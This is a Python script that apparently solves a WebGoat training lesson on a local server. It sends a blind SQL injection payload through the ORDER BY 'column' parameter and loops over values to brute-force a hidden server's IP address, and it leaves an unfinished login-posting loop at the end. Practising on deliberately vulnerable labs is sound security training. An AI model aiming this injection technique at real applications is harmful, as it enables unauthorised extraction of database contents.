#!/usr/bin/env python3

import requests
import re
import json

WebGoatIP = '127.0.0.1:8080'
Request = 'http://{}/WebGoat/SqlInjection/servers?column={}' #FIXME
JSESSIONID = '166548C2EC5DEFB28CF677503338BE4F' #FIXME

regEx = re.compile('\* [0-9]+\-[0-9]+')

httpHeaders = {
        'Host': WebGoatIP,
        'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'http://{}/WebGoat/start.mvc'.format(WebGoatIP),
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': 'JSESSIONID={}'.format(JSESSIONID),
        'Connection': 'keep-alive',
        }

def success():
    url = 'http://{}/WebGoat/service/lessonprogress.mvc HTTP/1.1'.format(WebGoatIP)
    res = requests.get(url, headers=httpHeaders)
    response = res.text

def getRequest(sortBy, debug=True):
    req = Request.format(WebGoatIP, sortBy)
    if debug:
        print('Debug: sending request: ', req)
    res = requests.get(req, headers=httpHeaders)
    jstr = json.loads(res.text)
    #print(jstr)
    if debug:
        print('{:5}{:25}{:15}'.format('id', 'hostname', 'ip'))

    ids = []
    for data in jstr:
        #print(data)
        # check if returned servers is sorted based on ids
        ids.append(int(data['id']))
        if debug:
            print('{:5}{:25}{:15}'.format(data['id'], data['hostname'], data['ip']))
    
    if ids == sorted(ids):
        return True

    return False

def test():
    #sort by id, hostname, ip
    #sortBy = 'hostname'
    sortBy = "(case when (select ip from servers where hostname='webgoat-pre-prod') = '192.168.6.10' then \
        id else hostname end)" # this is true; so sort by id; also we confirmed that servers table exists
    if getRequest(sortBy, True):
        print('Success!')
    else:
        print('Keep trying!')

# Runt this for to find the ip of webgoat-prd server
def bruteForce():
    sortBy = """
    (case when (select ip from servers where hostname='webgoat-prd') = '{}' then
    id else hostname end)
    """
    for i in range(1, 255): # check for values between 1 and 254.130.219.202
        ip = '{}.130.219.202'.format(i)
        if getRequest(sortBy.format(ip), False):
            print('Success!')
            print('The ip address is {}'.format(ip))
            break


def postRequest():
    formData = {'Username': 'hacker',
            'Password': 'cracker',
            'SUBMIT': 'Login'
            }

    for num in range(100):
        res = requests.post(Request, data=formData, headers=httpHeaders)
        response = res.text
        s = regEx.search(response)
        print(response)
        if s:
            print('*** found weakid ***')
            weakID = s.group()
            weakID = weakID[2:]
            print(weakID)
            break
            #httpHeaders['Cookie'] = 'JSESSIONID=%s;WEAKID=%s'%(JSESSIONID, weakID)
            #formData['WEAKID'] = weakID
            #print(httpHeaders)
            #print(formData)
            #for i in range(8):
            #res = requests.post(URL, data=formData, headers=httpHeaders)
            #url = 'http://%s:8080/WebGoat/service/lessonprogress.mvc HTTP/1.1'%WebGoatIP 
            #res = requests.get(url, headers=httpHeaders)
            #response = res.text
            #print(response)
            #if "Congratulations. You have successfully" in response:
            #    print("Successfully hacked...Well done!")  
            #    break


if __name__ == "__main__":
    #getRequest()
    test()
    #bruteForce()